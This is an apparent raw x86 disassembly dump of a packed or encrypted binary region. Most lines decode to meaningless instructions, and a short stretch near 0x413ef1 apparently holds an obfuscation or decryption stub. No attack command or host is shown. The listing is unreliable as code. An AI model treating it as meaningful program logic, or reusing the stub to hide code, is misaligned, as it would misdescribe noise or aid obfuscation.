  413cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cc0:	sti    
  413cc1:	call   0x2425e853
  413cc6:	pop    es
  413cc7:	cmp    al,0xcd
  413cc9:	rol    DWORD PTR [eax],0x89
  413ccc:	inc    ecx
  413ccd:	xchg   DWORD PTR [esi-0x44f9e227],esi
  413cd3:	jno    0x413cc0
  413cd5:	mov    eax,ds:0xce5cd3a6
  413cda:	add    BYTE PTR [edi],0x15
  413cdd:	jae    0x413c77
  413cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ce0:	adc    DWORD PTR [ebx-0x7],eax
  413ce3:	mov    ds:0xe6300ac0,al
  413ce8:	add    ecx,esi
  413cea:	fprem  
  413cec:	lods   eax,DWORD PTR ds:[esi]
  413ced:	fiadd  WORD PTR [eax+0x2e537c98]
  413cf3:	iret   
  413cf4:	int    0x77
  413cf6:	inc    ebx
  413cf7:	push   edx
  413cf8:	(bad)
  413cfb:	retf   0xeea7
  413cfe:	test   DWORD PTR [ebx],edx
  413d00:	mov    ch,0xf4
  413d02:	push   esp
  413d03:	jbe    0x413cfa
  413d05:	sub    eax,eax
  413d07:	lock call 0xe53ef6db
  413d0d:	adc    eax,0xffcfdcce
  413d12:	jecxz  0x413d7b
  413d14:	mov    ch,0x44
  413d16:	imul   edi,DWORD PTR [edx],0x2d
  413d19:	adc    ch,ch
  413d1b:	mov    edx,0xd4e1060e
  413d20:	cmp    BYTE PTR [ebx],ah
  413d22:	retf   
  413d23:	std    
  413d24:	in     eax,0x6b
  413d26:	sahf   
  413d27:	sbb    dl,BYTE PTR [eax+0x3a]
  413d2a:	out    0xe5,eax
  413d2c:	mov    ah,0x7b
  413d2e:	cmp    BYTE PTR [ebx+0x69cd9fe],bl
  413d34:	push   ecx
  413d35:	sub    BYTE PTR [ebx],0xfc
  413d38:	popf   
  413d39:	push   ds
  413d3a:	fwait
  413d3b:	ret    
  413d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d3d:	adc    al,al
  413d3f:	mov    ?,WORD PTR [ecx-0x78]
  413d42:	or     bh,dh
  413d44:	adc    cl,bh
  413d46:	adc    al,0xcf
  413d49:	dec    edx
  413d4a:	and    ebx,DWORD PTR [ebx+0x616b8395]
  413d50:	(bad)  
  413d51:	sbb    eax,0xfcbca1b8
  413d56:	cdq    
  413d57:	(bad)  
  413d58:	ficom  WORD PTR [esi+0x7ac33c7a]
  413d5e:	add    ebp,DWORD PTR [edx+0x4315f066]
  413d64:	adc    ah,BYTE PTR [esi]
  413d66:	jg     0x413cf8
  413d68:	push   esi
  413d69:	add    BYTE PTR [edi],cl
  413d6b:	aam    0xb
  413d6d:	retf   
  413d6e:	adc    esi,esi
  413d70:	stc    
  413d71:	imul   eax,DWORD PTR [esi+0x4b],0xffffffb2
  413d75:	push   esp
  413d76:	inc    ebp
  413d77:	mov    dl,0x15
  413d79:	inc    ecx
  413d7a:	sub    eax,0xa9709755
  413d7f:	retf   
  413d80:	test   DWORD PTR [ebp+0x26],0x771a439
  413d87:	gs std 
  413d89:	out    dx,eax
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	dec    edi
  413d8c:	or     ch,BYTE PTR [esi-0xc]
  413d8f:	mov    ds:0xe4179e32,al
  413d94:	(bad)  
  413d95:	fsubp  st(0),st
  413d97:	jge    0x413de0
  413d99:	retf   0x8663
  413d9c:	push   es
  413d9d:	adc    esp,0xaf830477
  413da3:	xchg   ecx,eax
  413da4:	or     eax,0xe0626b7a
  413da9:	rcr    BYTE PTR [ebp+0x95815a1],1
  413daf:	lahf   
  413db0:	(bad)  
  413db1:	mov    bh,0x0
  413db3:	pop    eax
  413db4:	and    dl,BYTE PTR [ebp+0x60]
  413db7:	sbb    BYTE PTR [ebx+0x304da056],0x8f
  413dbe:	cmc    
  413dbf:	cmp    al,cl
  413dc1:	lods   al,BYTE PTR ds:[esi]
  413dc2:	xor    DWORD PTR [ebx+0x729fcda0],0xb2270a12
  413dcc:	cmp    ebp,ecx
  413dce:	mov    ds:0xac9715c3,al
  413dd3:	adc    dh,BYTE PTR [ecx*2-0xcd0797b]
  413dda:	dec    esp
  413ddb:	jb     0x413e21
  413ddd:	or     al,BYTE PTR [edi]
  413ddf:	mov    ds:0x2249df1c,al
  413de4:	fistp  DWORD PTR [esi]
  413de6:	jbe    0x413deb
  413de8:	cwde   
  413de9:	mov    esp,0x314c4fbb
  413dee:	daa    
  413def:	int3   
  413df0:	inc    ebx
  413df1:	dec    esi
  413df2:	and    eax,0xf68cce0c
  413df7:	mov    bh,0x17
  413df9:	(bad)  
  413dfa:	jge    0x413dbf
  413dfc:	scas   al,BYTE PTR es:[edi]
  413dfd:	sub    BYTE PTR [edx-0x2],dh
  413e00:	mov    al,ds:0x1f029cf5
  413e05:	dec    ecx
  413e06:	pop    edi
  413e07:	test   eax,0xf40f04a7
  413e0c:	(bad)  
  413e0d:	out    0x2f,al
  413e0f:	inc    esp
  413e10:	pop    ebx
  413e11:	stc    
  413e12:	mov    cl,0xa8
  413e14:	mov    bh,0x31
  413e16:	sbb    DWORD PTR [ecx],0x5b
  413e19:	mov    BYTE PTR [ecx],dh
  413e1b:	xor    al,0x75
  413e1d:	inc    esp
  413e1e:	mov    eax,0x23cf4b6d
  413e23:	push   es
  413e24:	mov    es,WORD PTR [ebx+0x6266eded]
  413e2a:	push   0xffffffa0
  413e2c:	lea    ebp,[ebx-0x24]
  413e2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e30:	(bad)  
  413e31:	out    dx,al
  413e32:	test   DWORD PTR [ebp+0x6bf115d6],ecx
  413e38:	lock repz sub al,0xb6
  413e3c:	xchg   esp,eax
  413e3d:	rcr    DWORD PTR [edi],0xa3
  413e40:	adc    bl,BYTE PTR [eax]
  413e42:	xchg   edi,eax
  413e43:	cwde   
  413e44:	add    cl,BYTE PTR [ecx-0x19]
  413e47:	fdiv   QWORD PTR [edx]
  413e49:	mov    eax,ds:0x11c843a2
  413e4e:	je     0x413e42
  413e50:	mov    eax,0x7c949433
  413e55:	aam    0x4b
  413e57:	hlt    
  413e58:	and    dl,BYTE PTR [esi+0x22]
  413e5b:	push   ds
  413e5c:	adc    ah,ah
  413e5e:	push   0xc6b18b0f
  413e63:	test   al,0xda
  413e65:	aam    0x9a
  413e67:	int    0xe1
  413e69:	out    0x68,eax
  413e6b:	sbb    al,0xa7
  413e6d:	xchg   DWORD PTR [edx-0x43d9673],eax
  413e73:	and    ecx,DWORD PTR [edx-0x58]
  413e76:	jne    0x413e5c
  413e78:	add    al,0x90
  413e7a:	in     eax,0x31
  413e7c:	sbb    DWORD PTR [ebx],0x78
  413e7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e80:	mov    ch,0xde
  413e82:	mov    esi,0x5fd59a21
  413e87:	jg     0x413ef1
  413e89:	xor    edx,ecx
  413e8b:	xchg   ebp,eax
  413e8c:	mov    edx,0xd819ac25
  413e91:	cs in  eax,0xed
  413e94:	fld    DWORD PTR [edi]
  413e96:	ret    0xc17b
  413e99:	or     al,0xac
  413e9b:	nop
  413e9c:	xlat   BYTE PTR ds:[ebx]
  413e9d:	push   ebp
  413e9e:	jns    0x413efc
  413ea0:	jp     0x413ee2
  413ea2:	mov    DWORD PTR [ecx+0x509a320],edx
  413ea8:	scas   eax,DWORD PTR es:[edi]
  413ea9:	pop    esp
  413eaa:	inc    eax
  413eab:	(bad)  
  413eac:	in     al,dx
  413ead:	cmp    al,0x54
  413eaf:	push   edi
  413eb0:	test   eax,0x39386d7
  413eb5:	shl    BYTE PTR [eax+0x653ba869],0x19
  413ebc:	or     DWORD PTR [ebx],0xb2c4da0b
  413ec2:	dec    ecx
  413ec3:	shr    BYTE PTR [ebp-0x471f4339],0x93
  413eca:	xchg   DWORD PTR [edx+0x10],edx
  413ecd:	(bad)  
  413ece:	cmp    esi,ecx
  413ed0:	and    eax,0xd584ff28
  413ed5:	clc    
  413ed6:	and    al,0x3e
  413ed8:	and    al,0x16
  413eda:	xchg   bh,ah
  413edc:	das    
  413edd:	aam    0x28
  413edf:	les    ebp,FWORD PTR [edx]
  413ee1:	pop    es
  413ee2:	stos   DWORD PTR es:[edi],eax
  413ee3:	popf   
  413ee4:	sbb    eax,0xec558b52
  413ee9:	mov    DWORD PTR [ebp+0x8],edx
  413eec:	jmp    0x4162e7
  413ef1:	mov    edx,DWORD PTR [ebp+0x8]
  413ef4:	mov    ebx,DWORD PTR [ebp-0x8]
  413ef7:	xor    edx,eax
  413ef9:	xor    ebx,eax
  413efb:	sub    edx,ebx
  413efd:	sub    edx,esi
  413eff:	xor    edx,eax
  413f01:	mov    DWORD PTR [ebp+0x8],edx
  413f04:	mov    edx,DWORD PTR [ebp+0x8]
  413f07:	mov    ebx,DWORD PTR [ebp-0x58]
  413f0a:	add    edx,0x5708f8
  413f10:	imul   edx,ebx
  413f13:	jmp    0x416299
  413f18:	push   eax
  413f19:	pusha  
  413f1a:	clc    
  413f1b:	push   es
  413f1c:	call   0x5435b3a7
  413f21:	add    dh,bh
  413f23:	or     BYTE PTR [ebp-0x6b],ch
  413f26:	add    bh,BYTE PTR [edi]
  413f28:	mov    ch,0x73
  413f2a:	jp     0x413fa6
  413f2c:	add    DWORD PTR [edi+0x7a],ebx
  413f2f:	jp     0x413fad
  413f31:	jecxz  0x413f32
  413f33:	mov    al,ds:0x6ed298b5
  413f38:	cdq    
  413f39:	pushf  
  413f3a:	out    dx,eax
  413f3b:	(bad)  
  413f3d:	push   eax
  413f3e:	ror    BYTE PTR [edx-0x17],1
  413f41:	enter  0x3eb4,0x3a
  413f45:	leave  
  413f46:	dec    esi
  413f47:	xchg   ecx,eax
  413f48:	into   
  413f49:	retf   0x15f6
  413f4c:	in     eax,dx
  413f4d:	xlat   BYTE PTR ds:[ebx]
  413f4e:	test   BYTE PTR [esi+ebx*1],cl
  413f51:	loopne 0x413f5f
  413f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f54:	jae    0x413f3e
  413f56:	rol    BYTE PTR [eax],1
  413f58:	out    dx,eax
  413f59:	cmp    BYTE PTR [edi+0x13],bh
  413f5c:	and    edx,DWORD PTR [edi-0x424d012e]
  413f62:	addr16 mov ds:0x89ed,eax
  413f66:	xor    eax,ebx
  413f68:	call   0x1fe1a791
  413f6d:	or     eax,0xdf0a18c2
  413f72:	mov    esp,esp
  413f74:	dec    ebp
  413f75:	loop   0x413f80
  413f77:	xchg   edi,eax
  413f78:	mov    eax,ds:0x72263032
  413f7d:	inc    eax
  413f7e:	sbb    eax,0xa922adec
  413f83:	iret   
  413f84:	stc    
  413f85:	mov    cl,BYTE PTR [ebx-0x7c]
  413f88:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f8a:	add    BYTE PTR [edi-0x1e],ah
  413f8d:	es into 
  413f8f:	stc    
  413f90:	xor    al,0x5
  413f92:	fld    DWORD PTR [esi]
  413f94:	jmp    0x41400e
  413f96:	(bad)  
  413f97:	inc    esi
  413f98:	(bad)  
  413f99:	sahf   
  413f9a:	mov    ah,cl
  413f9c:	or     al,0xa2
  413f9e:	jbe    0x413f5f
  413fa0:	jmp    0xe87a:0x9aa4cb3a
  413fa7:	out    dx,al
  413fa8:	out    0x6b,al
  413faa:	mov    ah,0xc2
  413fac:	or     edx,DWORD PTR [edx+ebp*8-0x62ffb1fe]
  413fb3:	je     0x413fdd
  413fb5:	shl    BYTE PTR [edx+0x17],0x31
  413fb9:	push   esp
  413fba:	sbb    dl,ah
  413fbc:	jb     0x414008
  413fbe:	aam    0xc3
  413fc0:	data16 jmp 0x414015
  413fc3:	lahf   
  413fc4:	retf   0x3e5d
  413fc7:	cmp    esi,esi
  413fc9:	mov    edi,0xf7c81db5
  413fce:	ds (bad) 
  413fd0:	jno    0x413fd2
  413fd2:	sbb    bh,BYTE PTR [ecx+0x77505042]
  413fd8:	inc    ebx
  413fd9:	jmp    0x413fca
  413fdb:	add    eax,0x631a5e1b
  413fe0:	retf   0x8413
  413fe3:	jnp    0x414054
  413fe5:	out    dx,al
  413fe6:	add    DWORD PTR [ebx],0xffffff9d
  413fe9:	mov    ecx,0xa4f48d62
  413fee:	sbb    ch,bh
  413ff0:	mov    al,0x55
  413ff2:	jecxz  0x413f8f
  413ff4:	bound  edx,QWORD PTR [ebx+0x472f2ce0]
  413ffa:	and    al,0xef
  413ffc:	push   edx
  413ffd:	test   eax,0x3608799c
  414002:	mov    esp,0x81e3aa12
  414007:	(bad)  
  414008:	mov    edx,0x46a70442
  41400d:	popa   
  41400e:	loope  0x414006
  414010:	call   0x8e9c:0x35e325dc
  414017:	mov    bl,0x6
  414019:	int    0x12
  41401b:	fidivr WORD PTR ds:0x42e07296
  414021:	(bad)  
  414022:	mov    esi,0x948dba5c
  414027:	sbb    BYTE PTR [edx],ah
  414029:	sbb    eax,0x86698310
  41402e:	mov    gs,WORD PTR [ecx-0x2b9a6a1]
  414034:	out    dx,eax
  414035:	adc    al,0xfd
  414037:	popf   
  414038:	popf   
  414039:	mov    bl,0x2f
  41403b:	mov    al,0x52
  41403d:	jo     0x41407b
  41403f:	jns    0x41402d
  414041:	mov    esp,DWORD PTR [eax-0x55]
  414044:	cmp    al,BYTE PTR [esi-0x64]
  414047:	sbb    al,0xf
  414049:	mov    bh,0xff
  41404b:	inc    ecx
  41404c:	pop    ds
  41404d:	xlat   BYTE PTR ds:[ebx]
  41404e:	fnstsw WORD PTR [ecx+0x6131c671]
  414054:	ins    BYTE PTR es:[edi],dx
  414055:	xlat   BYTE PTR ds:[ebx]
  414056:	ss ret 0xc0d9
  41405a:	test   eax,0x6390a90b
  41405f:	(bad)  [ebp-0x622d0ddd]
  414065:	jge    0x4140b7
  414067:	mov    eax,0x6933bc60
  41406c:	shl    BYTE PTR [edi],cl
  41406e:	(bad)  
  41406f:	xor    DWORD PTR [ebp+0x1e],eax
  414072:	sti    
  414073:	test   eax,0x7b8e78c2
  414078:	mov    dh,0x44
  41407a:	mov    WORD PTR [ebx],?
  41407c:	mov    bl,BYTE PTR [ebx+0x7e]
  41407f:	stos   DWORD PTR es:[edi],eax
  414080:	mov    edx,0x66fc2e4d
  414085:	mov    esi,0x3da86e81
  41408a:	loope  0x414076
  41408c:	sub    esp,ebx
  41408e:	stc    
  41408f:	out    dx,al
  414090:	and    eax,0x61a18b0c
  414095:	retf   
  414096:	fist   DWORD PTR [esi]
  414098:	bound  esi,QWORD PTR [eax+eiz*4-0xd]
  41409c:	inc    ecx
  41409d:	repz int 0x6d
  4140a0:	xchg   edx,eax
  4140a1:	smsw   eax
  4140a4:	jnp    0x414042
  4140a6:	out    dx,al
  4140a7:	mov    ds:0x80fce406,eax
  4140ac:	shl    BYTE PTR es:[ebp+0x5e],0x6b
  4140b1:	std    
  4140b2:	jp     0x4140ce
  4140b4:	cmc    
  4140b5:	push   edx
  4140b6:	test   BYTE PTR [ebp-0x1d],al
  4140b9:	sbb    edi,edx
  4140bb:	out    dx,eax
  4140bc:	(bad)  [edi-0x1f]
  4140bf:	mov    esi,0x4d1a07c3
  4140c4:	push   edi
  4140c5:	mul    BYTE PTR [esi+ebp*4-0x6bff1fbf]
  4140cc:	fs dec esi
  4140ce:	inc    eax
  4140cf:	xor    ch,dl
  4140d1:	and    cl,ah
  4140d3:	ds repz dec ebp
  4140d6:	arpl   WORD PTR [esi+0x42defb8b],bx
  4140dc:	add    dl,bl
  4140de:	mov    cl,BYTE PTR [edx*1-0x41f278ad]
  4140e5:	mov    ecx,0x51aec26e
  4140ea:	xchg   esp,eax
  4140eb:	cwde   
  4140ec:	mov    BYTE PTR [ebx+0x41],dl
  4140ef:	(bad)  
  4140f0:	into   
  4140f1:	jns    0x414075
  4140f3:	xchg   esp,eax
  4140f4:	retf   0xa3fb
  4140f7:	mov    edi,0x557eb168
  4140fc:	xchg   ecx,eax
  4140fd:	sbb    edx,DWORD PTR [ebx]
  4140ff:	add    DWORD PTR [ebx],edx
  414101:	sub    al,0x28
  414103:	leave  
  414104:	lds    edx,FWORD PTR [edx+ebx*8-0x74]
  414108:	in     al,dx
  414109:	not    BYTE PTR [ebx+0x21]
  41410c:	push   0x8ecb19ff
  414111:	call   0xe1ee:0x8d38dce5
  414118:	jmp    0xd993:0x3e94e00
  41411f:	fdivr  st(6),st
  414121:	ret    
  414122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414123:	je     0x41414c
  414125:	xor    esp,DWORD PTR [edx+eax*8+0x345d193e]
  41412c:	aad    0xbf
  41412e:	fistp  QWORD PTR ds:0x4c869dbb
  414134:	sbb    al,al
  414136:	loope  0x4140f7
  414138:	and    BYTE PTR [ebp-0x29f82af],bh
  41413e:	(bad)  
  41413f:	cmp    eax,0x9ac7ad94
  414144:	mov    cl,0x43
  414146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414147:	stos   BYTE PTR es:[edi],al
  414148:	call   0xb2540b70
  41414d:	mov    ecx,0xc75f99b
  414152:	leave  
  414153:	push   ecx
  414154:	bound  ecx,QWORD PTR [ecx]
  414156:	mov    eax,ds:0x9b839436
  41415b:	sub    BYTE PTR [esi-0x656ca7f1],cl
  414161:	(bad)  
  414162:	fs jg  0x414116
  414165:	nop
  414166:	inc    esp
  414167:	mov    cl,0x1e
  414169:	and    BYTE PTR [esi],ah
  41416b:	and    ecx,DWORD PTR [esi+ebx*8+0xa]
  41416f:	(bad)
  414173:	inc    esp
  414174:	stos   BYTE PTR es:[edi],al
  414175:	add    DWORD PTR [edx+0x51],ecx
  414178:	xor    DWORD PTR [edi],ebp
  41417a:	sub    bl,BYTE PTR [eax+0x104741b3]
  414180:	cmp    BYTE PTR ds:0x1cb056a3,dh
  414186:	push   esp
  414187:	inc    edi
  414188:	sbb    eax,0xf90781ad
  41418d:	lock ror eax,cl
  414190:	aas    
  414191:	out    0x11,al
  414193:	dec    esp
  414194:	mov    ebx,DWORD PTR [ebx]
  414196:	cmp    al,0x2a
  414198:	push   eax
  414199:	mov    ch,0x8b
  41419b:	dec    edi
  41419c:	lock jecxz 0x4141d1
  41419f:	pop    ebx
  4141a0:	aam    0xb1
  4141a2:	ins    BYTE PTR es:[edi],dx
  4141a3:	xchg   edi,eax
  4141a4:	pop    ss
  4141a5:	or     al,0x46
  4141a7:	or     ah,BYTE PTR es:[eax+edi*2+0x27bbfd60]
  4141af:	repz push ss
  4141b1:	mov    edx,0xcc615752
  4141b6:	cmp    eax,0xe84c75d1
  4141bb:	imul   ebp,DWORD PTR [ebx-0x7841cdf8],0x1ed41dac
  4141c5:	daa    
  4141c6:	pusha  
  4141c7:	xchg   esp,eax
  4141c8:	jmp    0xefc0a792
  4141cd:	mov    al,0x3b
  4141cf:	mov    edx,ecx
  4141d1:	mov    ds:0xfb27b7d7,eax
  4141d6:	lods   eax,DWORD PTR ds:[esi]
  4141d7:	(bad)  
  4141d8:	adc    eax,0xacd49507
  4141dd:	outs   dx,DWORD PTR ds:[esi]
  4141de:	and    edi,DWORD PTR [esi+0x48ee5591]
  4141e4:	stc    
  4141e5:	dec    esi
  4141e6:	test   al,0xb3
  4141e8:	push   0xfffffff7
  4141ea:	push   ebp
  4141eb:	jae    0x4141f5
  4141ed:	mov    al,0x9b
  4141ef:	into   
  4141f0:	fld    DWORD PTR [eax-0x78]
  4141f3:	mov    dh,0xcd
  4141f5:	sbb    al,0x54
  4141f7:	retf   0xf745
  4141fa:	aad    0x9d
  4141fc:	add    ebx,DWORD PTR [edi+0x1200af80]
  414202:	jle    0x414251
  414204:	xchg   esp,eax
  414205:	cwde   
  414206:	jl     0x41427b
  414208:	fldenv [ebx]
  41420a:	nop
  41420b:	fbstp  TBYTE PTR [edx-0x1b7ea4a6]
  414211:	mov    DWORD PTR [ebx+0x1f1b8cc6],esp
  414217:	or     DWORD PTR [esi],0x392f7b2a
  41421d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41421e:	add    eax,0x5af283b8
  414223:	push   ebp
  414224:	imul   edi,DWORD PTR [eax+ebx*1],0x6e
  414228:	xor    al,0xdc
  41422a:	cmp    eax,0xb52311f3
  41422f:	ins    BYTE PTR es:[edi],dx
  414230:	cmp    esi,DWORD PTR [edx+0x59]
  414233:	push   ecx
  414234:	push   edi
  414235:	shr    al,cl
  414237:	(bad)  
  414238:	repnz dec ebp
  41423a:	call   0xadeaf166
  41423f:	std    
  414240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414241:	pop    esp
  414242:	lds    ebx,FWORD PTR [ebx]
  414244:	shl    DWORD PTR [bx+di+0x59],1
  414248:	pop    esi
  414249:	aad    0x94
  41424b:	(bad)  
  41424c:	fs push ss
  41424e:	jns    0x41426f
  414250:	inc    edi
  414251:	out    0x4c,al
  414253:	adc    ecx,DWORD PTR [edi]
  414255:	clc    
  414256:	femms  
  414258:	(bad)  
  414259:	lock loope 0x414240
  41425c:	loopne 0x4142d6
  41425e:	or     DWORD PTR [esp+edi*1+0x5b],esi
  414262:	pop    esi
  414263:	loopne 0x4141ff
  414265:	mov    esp,0xd3d3b778
  41426a:	sbb    ebp,DWORD PTR [esi]
  41426c:	stos   DWORD PTR es:[edi],eax
  41426d:	and    edx,DWORD PTR [eax+0x6433add8]
  414273:	(bad)  
  414274:	clc    
  414275:	xlat   BYTE PTR ds:[ebx]
  414276:	pusha  
  414277:	dec    eax
  414278:	and    bl,BYTE PTR [ecx+0x19eec1]
  41427e:	dec    ebp
  41427f:	rcr    ebp,0x5e
  414282:	jb     0x41420e
  414284:	push   0x23
  414286:	rcr    BYTE PTR [edx],cl
  414288:	xchg   edx,eax
  414289:	out    0xdb,al
  41428b:	sbb    esi,esp
  41428d:	fimul  DWORD PTR [edi+ebx*4-0x85f5b44]
  414294:	pop    esp
  414295:	ror    BYTE PTR [eax+0x27],cl
  414298:	xor    ch,BYTE PTR [esi]
  41429a:	fidivr WORD PTR [edi]
  41429c:	cdq    
  41429d:	mov    dl,0xe5
  41429f:	mov    cs,WORD PTR [ebp-0xf]
  4142a2:	loope  0x41428e
  4142a4:	stos   BYTE PTR es:[edi],al
  4142a5:	xor    edi,DWORD PTR [edi]
  4142a7:	std    
  4142a8:	push   ebx
  4142a9:	es out 0x24,al
  4142ac:	push   edx
  4142ad:	sbb    BYTE PTR [edi],dh
  4142af:	out    0x36,eax
  4142b1:	dec    esp
  4142b2:	into   
  4142b3:	pop    ds
  4142b4:	pop    ebx
  4142b5:	mov    edi,0x19a4ea08
  4142ba:	fstp   TBYTE PTR [ebx-0x3d91a83]
  4142c0:	mov    ds:0x271e8209,al
  4142c5:	jns    0x4142ef
  4142c7:	adc    ch,BYTE PTR [edi]
  4142c9:	inc    eax
  4142ca:	int3   
  4142cb:	jp     0x41428c
  4142cd:	popa   
  4142ce:	fld    QWORD PTR [esp+esi*8+0xa]
  4142d2:	popa   
  4142d3:	mov    ds:0x8fe8e5ce,al
  4142d8:	ins    DWORD PTR es:[edi],dx
  4142d9:	xchg   BYTE PTR [eax],ah
  4142db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142dc:	pop    ds
  4142dd:	aaa    
  4142de:	enter  0xc16d,0x25
  4142e2:	jo     0x4142be
  4142e4:	scas   al,BYTE PTR es:[edi]
  4142e5:	retf   
  4142e6:	or     eax,DWORD PTR [eax-0x33]
  4142e9:	fnsave [ebx]
  4142eb:	xchg   ebx,eax
  4142ec:	mov    ch,0x88
  4142ee:	mov    ecx,0x9dd678f6
  4142f3:	shl    BYTE PTR [ebx-0x65],cl
  4142f6:	fmulp  st(3),st
  4142f8:	cmp    al,0x59
  4142fa:	mov    ah,0x66
  4142fc:	es in  eax,dx
  4142fe:	int3   
  4142ff:	js     0x41430f
  414301:	pusha  
  414302:	or     ch,dl
  414304:	out    0x42,eax
  414306:	cwde   
  414307:	lods   eax,DWORD PTR ds:[esi]
  414308:	add    ebp,DWORD PTR [esi]
  41430a:	or     eax,DWORD PTR ds:0x43f738ec
  414310:	and    esi,DWORD PTR [ebp+0x42f99418]
  414316:	push   esi
  414317:	gs mov ebx,0x6f1c0993
  41431d:	popa   
  41431e:	mov    al,ds:0xa45ca9ea
  414323:	adc    BYTE PTR [esi-0x76],0x9c
  414327:	repz sbb dh,BYTE PTR [esi+0x0]
  41432b:	sbb    eax,0x88132ffd
  414330:	xor    bh,BYTE PTR [ecx-0x44]
  414333:	push   ebx
  414334:	dec    ecx
  414335:	fbld   TBYTE PTR [esi-0x3]
  414338:	hlt    
  414339:	int    0xea
  41433b:	popf   
  41433c:	and    ch,al
  41433e:	pop    ecx
  41433f:	mov    cl,0x8f
  414341:	mov    ds:0x248a7125,eax
  414346:	mov    edx,0xc95569c9
  41434b:	pop    DWORD PTR ds:0x84a8ddfc
  414351:	lea    eax,[esi-0x6e]
  414354:	jg     0x414304
  414356:	or     DWORD PTR [esi-0x2e],ebp
  414359:	inc    ebp
  41435a:	pop    esp
  41435b:	jns    0x41431c
  41435d:	cmp    cl,ah
  41435f:	jle    0x41434a
  414361:	inc    ecx
  414362:	sbb    BYTE PTR [eax-0x42],cl
  414365:	(bad)  
  414368:	(bad)  
  414369:	in     eax,0x1
  41436b:	sub    ebx,esp
  41436d:	lea    edi,[eax+edi*2+0x4f]
  414371:	ja     0x4143ac
  414373:	outs   dx,DWORD PTR es:[esi]
  414375:	dec    esp
  414376:	cld    
  414377:	int    0xc6
  414379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41437a:	push   es
  41437b:	adc    al,0x4c
  41437d:	xor    al,0xf0
  41437f:	jle    0x414327
  414381:	repz adc BYTE PTR [edi],dh
  414384:	pmaxsw mm1,QWORD PTR [ebx+0x22]
  414388:	xchg   ebx,eax
  414389:	int3   
  41438a:	stos   BYTE PTR es:[edi],al
  41438b:	sbb    eax,0x4733d6ba
  414390:	xor    DWORD PTR [ecx-0x5b],0xd47bb6c8
  414397:	inc    edi
  414398:	adc    esp,DWORD PTR [ebx]
  41439a:	push   edi
  41439b:	dec    edx
  41439c:	jnp    0x414328
  41439e:	jo     0x4143f0
  4143a0:	sbb    ebx,DWORD PTR [ebp+edx*1-0x32e3b229]
  4143a7:	sti    
  4143a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143a9:	lods   eax,DWORD PTR ds:[esi]
  4143aa:	cmp    bh,dh
  4143ac:	add    al,0x60
  4143ae:	inc    ebp
  4143af:	and    DWORD PTR [ebp+0x31],0x3c
  4143b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143b4:	push   0xea338dcf
  4143b9:	xlat   BYTE PTR ds:[ebx]
  4143ba:	xchg   edi,eax
  4143bb:	add    ebx,DWORD PTR [esi+0x75]
  4143be:	pop    esp
  4143bf:	inc    edx
  4143c0:	fwait
  4143c1:	sbb    BYTE PTR [edx-0x408dbb1e],al
  4143c7:	and    eax,0xe098755d
  4143cc:	adc    DWORD PTR [ebx-0x59],edx
  4143cf:	popa   
  4143d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143d1:	ret    
  4143d2:	loopne 0x414363
  4143d4:	pop    eax
  4143d5:	stos   DWORD PTR es:[edi],eax
  4143d6:	add    BYTE PTR [ecx-0x6bccf0ed],cl
  4143dc:	lods   al,BYTE PTR ds:[esi]
  4143dd:	daa    
  4143de:	adc    eax,0x8ba17ae2
  4143e3:	pop    es
  4143e4:	fild   DWORD PTR [ebx]
  4143e6:	into   
  4143e7:	adc    edx,DWORD PTR [ebx-0x1afe465b]
  4143ed:	sub    ch,0x48
  4143f0:	xor    al,0x9
  4143f2:	pusha  
  4143f3:	pop    edx
  4143f4:	mov    ah,0x25
  4143f6:	adc    DWORD PTR [edx],ebp
  4143f8:	fiadd  DWORD PTR [edx+ecx*4]
  4143fb:	mov    ecx,0xae8d9248
  414400:	push   es
  414401:	rcl    DWORD PTR [ebx],1
  414403:	scas   eax,DWORD PTR es:[edi]
  414404:	adc    bh,ch
  414406:	retf   0xb9dc
  414409:	and    BYTE PTR [ebx],0x95
  41440c:	xchg   ecx,eax
  41440d:	mov    al,0x2d
  41440f:	sub    al,BYTE PTR [ebx-0x6cb0bd82]
  414415:	adc    DWORD PTR [ebx],0xffffffe3
  414418:	arpl   WORD PTR [esi-0x770e81d2],di
  41441e:	or     BYTE PTR [edx-0x27],dl
  414421:	daa    
  414422:	push   0x1b40ccb4
  414427:	retf   0x314a
  41442a:	pusha  
  41442b:	int    0xdc
  41442d:	sar    BYTE PTR [edx+esi*8],cl
  414430:	sbb    BYTE PTR [ebx+eax*1+0x1b35127f],ch
  414437:	dec    ebx
  414438:	xchg   edi,eax
  414439:	mov    ds:0xc3aacd27,eax
  41443e:	or     DWORD PTR [esi-0x871e267],esp
  414444:	adc    eax,0x1f8ca715
  414449:	scas   al,BYTE PTR es:[edi]
  41444a:	fcmovb st,st(0)
  41444c:	sub    DWORD PTR [ecx],edi
  41444e:	sbb    DWORD PTR fs:[edx],edx
  414451:	push   ds
  414452:	xor    DWORD PTR [eax],edi
  414454:	add    DWORD PTR [ebp-0x410968e9],0xffffffe5
  41445b:	(bad)  
  41445c:	jb     0x414484
  41445e:	nop
  41445f:	rcr    BYTE PTR [ebp+0x7b],1
  414462:	outs   dx,BYTE PTR ds:[esi]
  414463:	ins    BYTE PTR es:[edi],dx
  414464:	pop    esp
  414465:	out    0x74,eax
  414467:	loope  0x414405
  414469:	lahf   
  41446a:	retf   
  41446b:	ja     0x41444b
  41446d:	aas    
  41446e:	ret    
  41446f:	fisttp WORD PTR [edx]
  414471:	std    
  414472:	xor    eax,0x961b192c
  414477:	cmp    al,bl
  414479:	sbb    al,0xc1
  41447b:	cs rcr dl,cl
